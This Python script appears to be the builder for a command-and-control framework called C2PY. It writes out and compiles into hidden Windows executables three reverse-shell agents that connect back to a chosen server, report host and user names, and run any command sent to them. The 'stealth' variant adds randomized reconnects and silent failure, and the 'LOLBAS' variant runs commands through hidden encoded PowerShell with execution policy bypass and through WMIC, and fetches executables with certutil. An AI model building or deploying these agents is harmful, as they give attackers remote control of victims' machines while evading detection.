"""
Final Build Automation Script for C2PY
Complete EXE generation with all optimizations
"""

import os
import sys
import subprocess
import json
import time
from pathlib import Path

class FinalBuildAutomation:
    """Complete build automation for C2PY agents"""
    
    def __init__(self):
        self.workspace = os.path.dirname(os.path.abspath(__file__))
        self.agents_dir = os.path.join(self.workspace, 'agents')
        self.dist_dir = os.path.join(self.workspace, 'dist')
        
        # Ensure directories exist
        os.makedirs(self.agents_dir, exist_ok=True)
        os.makedirs(self.dist_dir, exist_ok=True)
    
    def check_dependencies(self):
        """Check and install required dependencies"""
        required_packages = [
            'pyinstaller',
            'requests',
            'cryptography',
            'psutil'
        ]
        
        for package in required_packages:
            try:
                __import__(package)
                print(f"✓ {package} is available")
            except ImportError:
                print(f"Installing {package}...")
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                    print(f"✓ {package} installed successfully")
                except Exception as e:
                    print(f"✗ Failed to install {package}: {e}")
    
    def create_basic_agent(self, server_ip="127.0.0.1", server_port=4444):
        """Create basic reliable agent"""
        agent_code = f'''# Basic Reliable Agent
import socket
import subprocess
import os
import sys
import time
import json

class BasicAgent:
    def __init__(self):
        self.server_ip = "{server_ip}"
        self.server_port = {server_port}
        self.running = True
    
    def execute_command(self, command):
        """Execute command safely"""
        try:
            if command.lower() in ['exit', 'quit']:
                self.running = False
                return "Agent shutting down..."
            
            # Execute command with proper encoding
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            
            output = result.stdout
            if result.stderr:
                output += "\\nErrors:\\n" + result.stderr
            
            return output if output else "Command executed successfully (no output)"
            
        except Exception as e:
            return f"Command execution failed: {{str(e)}}"
    
    def connect_to_server(self):
        """Main connection loop"""
        while self.running:
            try:
                # Connect to server
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((self.server_ip, self.server_port))
                
                # Send initial beacon
                beacon = {{
                    'type': 'basic_agent',
                    'hostname': os.getenv('COMPUTERNAME', 'unknown'),
                    'username': os.getenv('USERNAME', 'unknown'),
                    'platform': sys.platform,
                    'pid': os.getpid()
                }}
                
                s.send(json.dumps(beacon).encode() + b'\\n')
                
                # Main command loop
                while self.running:
                    try:
                        # Receive command
                        command = s.recv(4096).decode().strip()
                        if not command:
                            break
                        
                        # Execute and send response
                        result = self.execute_command(command)
                        response = str(result).encode()
                        s.send(response + b'\\n')
                        
                    except socket.timeout:
                        continue
                    except Exception:
                        break
                
                s.close()
                
            except Exception:
                if self.running:
                    time.sleep(30)  # Wait before retry

def main():
    try:
        agent = BasicAgent()
        agent.connect_to_server()
    except Exception:
        pass

if __name__ == "__main__":
    main()'''
        
        return agent_code
    
    def create_stealth_agent(self, server_ip="127.0.0.1", server_port=4444):
        """Create advanced stealth agent"""
        agent_code = f'''# Advanced Stealth Agent
import socket
import subprocess
import threading
import base64
import os
import sys
import time
import random
import json

class StealthAgent:
    def __init__(self):
        self.server_ip = "{server_ip}"
        self.server_port = {server_port}
        self.running = True
        self.session_id = self._generate_session_id()
    
    def _generate_session_id(self):
        """Generate unique session ID"""
        import hashlib
        data = f"{{os.getenv('COMPUTERNAME', 'unknown')}}{{time.time()}}"
        return hashlib.md5(data.encode()).hexdigest()[:8]
    
    def execute_stealthy(self, command):
        """Execute commands with stealth techniques"""
        try:
            # Execute command with proper encoding
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="ignore")
            return output
        except Exception as e:
            return f"Execution failed: {{str(e)}}"
    
    def maintain_connection(self):
        """Main connection logic"""
        retry_count = 0
        max_retries = 5
        
        while self.running and retry_count < max_retries:
            try:
                # Random delay between connections
                time.sleep(random.randint(1, 10))
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((self.server_ip, self.server_port))
                
                # Send initial beacon
                beacon = {{
                    'type': 'stealth_agent',
                    'session_id': self.session_id,
                    'hostname': os.getenv('COMPUTERNAME', 'unknown'),
                    'username': os.getenv('USERNAME', 'unknown'),
                    'os': f"{{os.name}} {{sys.platform}}",
                    'pid': os.getpid()
                }}
                
                s.send(json.dumps(beacon).encode() + b'\\n')
                retry_count = 0  # Reset on successful connection
                
                while self.running:
                    try:
                        command = s.recv(4096).decode().strip()
                        if not command:
                            break
                        
                        if command.lower() == 'exit':
                            self.running = False
                            break
                        elif command.lower() == 'info':
                            result = json.dumps(beacon)
                        else:
                            result = self.execute_stealthy(command)
                        
                        # Send response
                        response = str(result).encode()
                        s.send(response + b'\\n')
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        break
                
                s.close()
                
            except Exception as e:
                retry_count += 1
                wait_time = min(300, 30 * retry_count)  # Exponential backoff
                time.sleep(wait_time)

def main():
    try:
        agent = StealthAgent()
        agent.maintain_connection()
    except Exception as e:
        # Silent failure in production
        pass

if __name__ == "__main__":
    main()'''
        
        return agent_code
    
    def create_lolbas_agent(self, server_ip="127.0.0.1", server_port=4444):
        """Create LOLBAS agent using living-off-the-land techniques"""
        agent_code = f'''# LOLBAS Agent - Living Off The Land
import socket
import subprocess
import os
import tempfile
import base64
import json
import random
import time

class LOLBASAgent:
    def __init__(self):
        self.server_ip = "{server_ip}"
        self.server_port = {server_port}
        self.techniques = {{
            'powershell': self._exec_powershell,
            'wmic': self._exec_wmic,
            'certutil': self._exec_certutil
        }}
    
    def _exec_powershell(self, command):
        """Execute via PowerShell"""
        encoded_command = base64.b64encode(command.encode('utf-16le')).decode()
        ps_command = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {{encoded_command}}'
        
        try:
            return subprocess.check_output(ps_command, shell=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="ignore")
        except Exception as e:
            return f"PowerShell execution failed: {{str(e)}}"
    
    def _exec_wmic(self, command):
        """Execute via WMIC"""
        try:
            wmic_command = f'wmic process call create "cmd.exe /c {{command}}"'
            result = subprocess.check_output(wmic_command, shell=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="ignore")
            return result
        except Exception as e:
            return f"WMIC execution failed: {{str(e)}}"
    
    def _exec_certutil(self, url_or_command):
        """Execute via CertUtil download"""
        if url_or_command.startswith('http'):
            # Download mode
            filename = f"temp_{{random.randint(1000, 9999)}}.exe"
            download_path = os.path.join(tempfile.gettempdir(), filename)
            
            try:
                certutil_command = f'certutil.exe -urlcache -split -f "{{url_or_command}}" "{{download_path}}"'
                subprocess.check_output(certutil_command, shell=True, stderr=subprocess.STDOUT, encoding="utf-8", errors="ignore")
                return f"Downloaded: {{filename}}"
            except Exception as e:
                return f"CertUtil download failed: {{str(e)}}"
        else:
            return f"Invalid URL format"
    
    def execute_lolbas(self, technique, command):
        """Execute command using LOLBAS technique"""
        if technique in self.techniques:
            return self.techniques[technique](command)
        else:
            # Random technique selection
            random_technique = random.choice(list(self.techniques.keys()))
            return self.execute_lolbas(random_technique, command)
    
    def connect_back(self):
        """Main connection with LOLBAS capabilities"""
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.server_ip, self.server_port))
                
                # Send initial beacon
                beacon = {{
                    'type': 'lolbas_agent',
                    'hostname': os.getenv('COMPUTERNAME', 'unknown'),
                    'username': os.getenv('USERNAME', 'unknown'),
                    'techniques': list(self.techniques.keys())
                }}
                
                s.send(json.dumps(beacon).encode() + b'\\n')
                
                while True:
                    try:
                        data = s.recv(4096).decode().strip()
                        if not data:
                            break
                        
                        if data.lower() == 'exit':
                            break
                        elif data.startswith('lolbas:'):
                            # Format: lolbas:technique:command
                            parts = data.split(':', 2)
                            if len(parts) == 3:
                                _, technique, command = parts
                                result = self.execute_lolbas(technique, command)
                            else:
                                result = "Invalid LOLBAS format. Use: lolbas:technique:command"
                        elif data.startswith('download:'):
                            # Format: download:url
                            url = data.split(':', 1)[1]
                            result = self._exec_certutil(url)
                        else:
                            # Use random LOLBAS technique
                            technique = random.choice(['powershell', 'wmic'])
                            result = self.execute_lolbas(technique, data)
                        
                        s.send(str(result).encode() + b'\\n')
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        break
                
                s.close()
                
            except Exception as e:
                time.sleep(random.randint(30, 120))

def main():
    try:
        agent = LOLBASAgent()
        agent.connect_back()
    except Exception as e:
        pass

if __name__ == "__main__":
    main()'''
        
        return agent_code
    
    def build_agent(self, agent_code, output_name):
        """Build agent to EXE using PyInstaller"""
        try:
            # Create temporary Python file
            temp_file = os.path.join(self.agents_dir, f'{output_name}.py')
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(agent_code)
            
            # PyInstaller command
            cmd = [
                'pyinstaller',
                '--onefile',
                '--windowed',
                '--name', output_name,
                '--distpath', self.dist_dir,
                '--workpath', os.path.join(self.workspace, 'build'),
                '--specpath', self.agents_dir,
                temp_file
            ]
            
            print(f"Building {output_name}.exe...")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                exe_path = os.path.join(self.dist_dir, f'{output_name}.exe')
                if os.path.exists(exe_path):
                    size = os.path.getsize(exe_path)
                    print(f"✓ {output_name}.exe built successfully ({size} bytes)")
                    return {'success': True, 'path': exe_path, 'size': size}
                else:
                    print(f"✗ {output_name}.exe not found after build")
                    return {'success': False, 'error': 'EXE not found'}
            else:
                print(f"✗ Build failed for {output_name}")
                print(f"Error: {result.stderr}")
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            print(f"✗ Exception during build: {e}")
            return {'success': False, 'error': str(e)}
    
    def build_all_agents(self, server_ip="127.0.0.1", server_port=4444):
        """Build all agent types"""
        print("🚀 Starting C2PY Agent Build Process...")
        print("="*50)
        
        # Check dependencies first
        print("📋 Checking dependencies...")
        self.check_dependencies()
        print()
        
        agents = [
            ('basic_agent', self.create_basic_agent(server_ip, server_port)),
            ('stealth_agent', self.create_stealth_agent(server_ip, server_port)),
            ('lolbas_agent', self.create_lolbas_agent(server_ip, server_port))
        ]
        
        results = {}
        
        for agent_name, agent_code in agents:
            print(f"🔨 Building {agent_name}...")
            result = self.build_agent(agent_code, agent_name)
            results[agent_name] = result
            
            if result['success']:
                print(f"✅ {agent_name}.exe completed successfully")
            else:
                print(f"❌ {agent_name}.exe build failed: {result['error']}")
            print()
        
        # Summary
        print("📊 Build Summary:")
        print("="*50)
        successful = sum(1 for r in results.values() if r['success'])
        total = len(results)
        print(f"Successful builds: {successful}/{total}")
        
        for name, result in results.items():
            if result['success']:
                print(f"✓ {name}.exe - {result['size']} bytes")
            else:
                print(f"✗ {name}.exe - Failed")
        
        print(f"\nOutput directory: {self.dist_dir}")
        return results

def main():
    """Main build script"""
    print("🎯 C2PY Final Build Automation")
    print("=" * 50)
    
    builder = FinalBuildAutomation()
    
    # Default configuration
    server_ip = "127.0.0.1"
    server_port = 4444
    
    # Check for command line arguments
    if len(sys.argv) >= 2:
        server_ip = sys.argv[1]
    if len(sys.argv) >= 3:
        server_port = int(sys.argv[2])
    
    print(f"Server configuration: {server_ip}:{server_port}")
    print()
    
    # Build all agents
    results = builder.build_all_agents(server_ip, server_port)
    
    print("\n🎉 Build process completed!")

if __name__ == "__main__":
    main()
